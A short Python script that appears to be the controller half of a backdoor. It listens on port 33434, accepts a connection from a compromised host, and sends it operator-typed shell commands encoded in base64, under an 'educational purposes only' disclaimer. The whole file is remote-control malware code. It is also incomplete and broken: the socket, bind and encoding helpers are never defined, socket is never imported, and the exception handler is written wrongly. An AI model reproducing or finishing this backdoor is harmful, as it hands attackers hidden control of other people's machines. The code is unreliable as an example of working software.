#!/usr/bin/env python3
# -*- coding: utf-8 -*-


# ----------------------------------------------------
# This program is for educational purposes only!
# I am not responsible for anything you do with it.
# ----------------------------------------------------


# Variables
__version__ = '0.0.1'
CHUNKS = 2048
PORT = 33434


def main():

    _socket = simple_python_backdoor_create_socket()
    simple_python_backdoor_socket_bind(_socket)

    try:
        connection, address = _socket.accept()
        # No timeout
        connection.setblocking(1)
        print(f'Connection has been established [IP: {address[0]} / PORT: {address[1]}]!!!')
    except socket.error() as str_error:
        print(f'\nError accepting connections!!!\n{str_error}')

    while True:
        data = connection.recv(CHUNKS)
        str_data = data.decode('windows-1252')
        print(str_data)
        command = input('Shell >>> ').lower()
        output = _base64_encode(command.encode())
        connection.send(output)


if __name__ == '__main__':
    main()
